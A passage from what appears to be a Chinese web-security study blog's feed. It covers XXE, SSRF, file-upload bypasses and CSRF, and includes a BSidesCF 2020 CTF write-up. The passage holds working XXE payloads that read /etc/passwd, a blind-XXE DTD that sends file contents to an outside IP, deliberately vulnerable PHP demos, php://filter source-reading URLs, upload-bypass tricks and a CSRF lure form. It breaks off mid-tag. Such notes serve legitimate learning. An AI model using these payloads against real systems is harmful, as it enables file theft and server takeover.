class="headerlink" title="XXE注入漏洞原理"></a>XXE注入漏洞原理</h3><blockquote><p>XXE外部实体注入漏洞，xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体加载，可能导致加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、内网攻击、dos攻击等危害</p></blockquote><p>xxe漏洞触发点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致恶意上传xml文件</p><h4 id="漏洞代码demo"><a href="#漏洞代码demo" class="headerlink" title="漏洞代码demo"></a>漏洞代码demo</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="variable">$xml</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="variable">$data</span>=simplexml_load_string(<span class="variable">$xml</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XXE漏洞利用我"><a href="#XXE漏洞利用我" class="headerlink" title="XXE漏洞利用我"></a>XXE漏洞利用我</h3><h4 id="有回显任意文件读取"><a href="#有回显任意文件读取" class="headerlink" title="有回显任意文件读取"></a>有回显任意文件读取</h4><p>上面已经给出读取代码，这里给出一种读取php源代码的payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=test.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="无回显文件读取"><a href="#无回显文件读取" class="headerlink" title="无回显文件读取"></a>无回显文件读取</h4><p>payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.103/test.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;e1;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>test.dtd代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;! ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;! ENTITY % p2 &quot;&lt;!ENTITY e1 SYSTEM &#39;http:&#x2F;&#x2F;192.168.1.103&#x2F;test.php?con&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于SSRF漏洞的学习笔记</title>
      <link href="2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>未完待续</p><span id="more"></span><h3 id="SSRF服务端请求伪造"><a href="#SSRF服务端请求伪造" class="headerlink" title="SSRF服务端请求伪造"></a>SSRF服务端请求伪造</h3><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p><p><img src="/2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210205132744574.png" class="lazyload" data-srcset="/2021/02/05/%E5%85%B3%E4%BA%8ESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210205132744574.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210205132744574"></p><h3 id="三种产生此漏洞的php函数dome"><a href="#三种产生此漏洞的php函数dome" class="headerlink" title="三种产生此漏洞的php函数dome"></a>三种产生此漏洞的php函数dome</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$content</span>=file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&quot;./images/&quot;</span>.rand().<span class="string">&#x27;imag1.jpg&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$img</span> =<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fp</span>=fsockopen(<span class="variable">$host</span>,intval(<span class="variable">$port</span>),<span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span>(error number <span class="subst">$errno</span>)\n&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$out</span>=<span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;Connection: Close\r\n\r\n&quot;</span></span><br><span class="line">        <span class="variable">$out</span>.=<span class="string">&quot;\r\n&quot;</span>;</span><br><span class="line">        fwrite(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(!feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">            <span class="variable">$contents</span>.=fgets(<span class="variable">$fp</span>,<span class="number">1024</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">        <span class="variable">$curlobj</span>=curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>,CURLOPT_POST,<span class="number">0</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$curlobj</span>,CUTLOPT_RETURNTRANSFER,<span class="literal">TRUE</span>);<span class="comment">//将curl_exec()获取的信息以字符串返回，不是直接输出</span></span><br><span class="line">        <span class="variable">$result</span>=curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line">        curl_close(<span class="variable">$curlobj</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$filename</span>=<span class="string">&#x27;./curled/&#x27;</span>.rand().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>,<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h4><p>内网探测</p><p>端口扫描</p>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[Bsidesctf 2020]Had a bad day</title>
      <link href="2021/02/03/bsidesctf-2020-had-a-bad-day/"/>
      <url>2021/02/03/bsidesctf-2020-had-a-bad-day/</url>
      
        <content type="html"><![CDATA[<p>简单的 php伪协议读源码</p><span id="more"></span><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><h4 id="伪协议读源码"><a href="#伪协议读源码" class="headerlink" title="伪协议读源码"></a>伪协议读源码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;  <span class="comment">//必须出现 woofers meowers index之一</span></span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);  <span class="comment">//强行加后缀</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="这个题有两种payload"><a href="#这个题有两种payload" class="headerlink" title="这个题有两种payload"></a>这个题有两种payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;woofers.&#x2F;..&#x2F;flag</span><br><span class="line">http:&#x2F;&#x2F;f18036a8-a230-43b0-bbe4-c96610e4407d.node3.buuoj.cn&#x2F;index.php?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure><h4 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h4><blockquote><p>php://filter 可以嵌套一层不存在的协议</p><p>php://filter/convert.base64-encode/woofers/resource=</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf-Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> php伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于文件上传的一些常见bypass技巧</title>
      <link href="2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/"/>
      <url>2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/</url>
      
        <content type="html"><![CDATA[<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>上传漏洞顾名思义，就是攻击者上传了一个可执行文件如木马，病毒，恶意脚本，WebShell等到服务器执行，并最终获得网站控制权限的高危漏洞。</p><span id="more"></span><h3 id="一些常见bypass技巧分析"><a href="#一些常见bypass技巧分析" class="headerlink" title="一些常见bypass技巧分析"></a>一些常见bypass技巧分析</h3><h4 id="bypass-javascript限制"><a href="#bypass-javascript限制" class="headerlink" title="bypass javascript限制"></a>bypass javascript限制</h4><p>前端对于后缀名有限制</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file= <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span>(file== <span class="literal">null</span> || file ==<span class="string">&quot;&quot;</span>)&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;请选择上传的文件&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext=<span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name= file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>))</span></span><br><span class="line">        if (allow_ext.indexOf(ext_name)== -1)&#123;</span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg= <span class="string">&quot;该文件不允许上传，请上传&quot;</span>+allow_ext+<span class="string">&quot;类型的文件&quot;</span>;</span></span><br><span class="line">            alert(errMsg);</span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>浏览器禁用js </p><p><img src="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203173826587.png" class="lazyload" data-srcset="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203173826587.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210203173826587"></p></li><li><p>burp直接删掉js</p><p><img src="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203193536829.png" class="lazyload" data-srcset="/2021/02/03/%E5%85%B3%E4%BA%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81bypass/image-20210203193536829.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210203193536829"></p></li></ul><h4 id="bypass-MIME类型限制"><a href="#bypass-MIME类型限制" class="headerlink" title="bypass MIME类型限制"></a>bypass MIME类型限制</h4><blockquote><p>MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种<a href="https://baike.baidu.com/item/%E6%89%A9%E5%B1%95%E5%90%8D/103577">扩展名</a>的<a href="https://baike.baidu.com/item/%E6%96%87%E4%BB%B6/6270998">文件</a>用一种<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/5985445">应用程序</a>来打开的方式类型，当该扩展名文件被访问的时候，<a href="https://baike.baidu.com/item/%E6%B5%8F%E8%A7%88%E5%99%A8/213911">浏览器</a>会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。</p></blockquote><p>在php代码中对 文件类型进行了限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>]== <span class="string">&#x27;image/jpeg&#x27;</span></span><br></pre></td></tr></table></figure><p>抓包 更改 Content-Type  放包即可绕过</p><h4 id="bypass-黑名单后缀名"><a href="#bypass-黑名单后缀名" class="headerlink" title="bypass 黑名单后缀名"></a>bypass 黑名单后缀名</h4><p>在 php 代码中做了如下限制</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&quot;upload_file&quot;</span>][<span class="string">&quot;name&quot;</span>] !=<span class="string">&quot;.php&quot;</span></span><br></pre></td></tr></table></figure><ul><li><p>我们可以采用php的一些别名来绕过</p><blockquote><p>php3 php5 phtml pht phps php4 php1  </p></blockquote></li><li><p>利用.htaccess进行绕过 </p><blockquote><p>htaccess文件是apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：</p><p>网页301重定向、自定义404错误页面、改变文件扩展名、允许/组织特定的用户或者目录的访问、禁止目录列表、配置</p><p>默认文档等功能。</p><p>其中 当.htaccess 文件内容：</p><p>SetHandler application/x-httpd-php</p><p>设置当前目录所有文件都使用php解析，无论上传任何文件，只要文件内容符合php语言代码规范，即可当做php代码执行</p></blockquote><p> <strong>一个重要的tip！</strong></p><blockquote><p>在 Apache中如果启动 .htaccess 必须在http.conf 中设置 AllowOverride  All</p></blockquote></li><li><p>利用大小写来绕过</p><blockquote><p>Windows下，对于文件名中的大小写不敏感。例如：test.php 和 TeST.PHP 是一样的</p><p>当然这种绕过方式只能应用于 windows系统</p></blockquote></li><li><p>利用空格绕过</p><blockquote><p>windows系统下，对于文件名中的空格会做空处理，程序中的检测代码却不能忽略空格。从而绕过黑名单。</p></blockquote></li><li><p>利用点号绕过</p><blockquote><p>windows系统下，文件后缀名最后一个点号会自动去除</p></blockquote></li><li><p>利用特殊符号绕过</p><blockquote><p>windows系统下，如果上传文件名中test.php::$DATA 会在服务器上生成一个test.php的文件，其中内容和所上传的文件内容相同，并被解析</p></blockquote></li><li><p>利用常规的双写绕过</p><blockquote><p>str_ireplace() 函数替换字符串中的一些字符，只进行一次</p><p>所以双写去掉一次，正好</p></blockquote></li></ul><h4 id="bypass-白名单后缀名"><a href="#bypass-白名单后缀名" class="headerlink" title="bypass 白名单后缀名"></a>bypass 白名单后缀名</h4><ul><li><p>00 截断</p><blockquote><p>0x00是16进制表示法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符</p><p>系统在对文件名的读取时，如果遇上0x00，就会认为读取已经结束</p></blockquote><p>一个重要的tips</p><blockquote><p>在php5.3之后的版本中完全修复了00截断。00截断受限于GPC是否开启</p></blockquote></li></ul><h4 id="bypass-文件二进制格式"><a href="#bypass-文件二进制格式" class="headerlink" title="bypass 文件二进制格式"></a>bypass 文件二进制格式</h4><p>在服务端的PHP代码中，对于用户上传的文件做文件类型检查，查看文件格式是否符合上传规范</p><p>比如对图片格式进行验证</p><p>我们可以</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF98A</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web漏洞笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入研究CSRF漏洞</title>
      <link href="2021/01/31/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2021/01/31/CSRF%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>CSRF作为一种被动的漏洞，在ctf比赛中较为少见，因此以往并没有引起笔者的重视</p><p>笔者最近在往实战方向转移，所以从新研究了一下csrf漏洞</p><span id="more"></span><h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><h3 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h3><p>CSRF(跨站伪造请求)也被成为One click Attack 或 Session Riding。</p><blockquote><p>XSS与CSRF的区别：</p><ol><li>XSS利用站点内的信任用户，盗取Cookie</li><li>CSRF通过伪造成受信任的用户请求受信任网站。</li></ol></blockquote><p><strong>原理：利用目标用户的合法身份，以目标用户的名义执行某些非法操作</strong></p><h3 id="CSRF漏洞利用"><a href="#CSRF漏洞利用" class="headerlink" title="CSRF漏洞利用"></a>CSRF漏洞利用</h3><p>GET型CSRF利用比较简单，此处不赘述</p><p>POST型CSRF利用 </p><p>我们利用表单进行提交。将标签的type属性设置为hidden，例如：<code>&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;11111&quot; /&gt;</code></p><p>下面写一个小demo</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>恭喜中奖<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/csrf_test/post_csrf/new_user.php&quot;</span> <span class="attr">method</span>=<span 